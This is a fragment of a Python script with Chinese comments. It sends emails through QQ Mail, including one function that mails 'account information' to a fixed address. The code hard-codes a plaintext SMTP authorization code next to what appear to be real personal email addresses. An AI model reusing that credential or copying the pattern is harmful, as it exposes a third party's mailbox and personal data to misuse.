...
def send_myself():
    ...
    # pwd为qq邮箱的授权码
    pwd = 'otfkaadeeikabcci'  # qq授权码
    
    # 发件人的邮箱
    # 有三种填写方式，经测试，要在web端和app端同时正常显示昵称和发件人，请使用第三种方法
    # sender_qq_mail = '1640891173@qq.com'
    # sender_qq_mail = '发件人昵称 <1640891173@qq.com>'
    sender_qq_mail = formataddr(["你的小可爱", "642856809@qq.com"])  # [昵称,邮箱]格式
    # 收件人邮箱
    receiver = '1640891173@qq.com'
    
    # 邮件的正文内容
    mail_content = info_str
    # 邮件标题
    mail_title = '账号信息'
...
def send_email_failed():
    ...
    # sender_qq_mail = '1640891173@qq.com'
    # sender_qq_mail = '发件人昵称 <1640891173@qq.com>'
    sender_qq_mail = formataddr(["小可爱收哦~", "642856809@qq.com"])  # [昵称,邮箱]格式
    # 收件人邮箱
    receiver = f'{userEmail}'
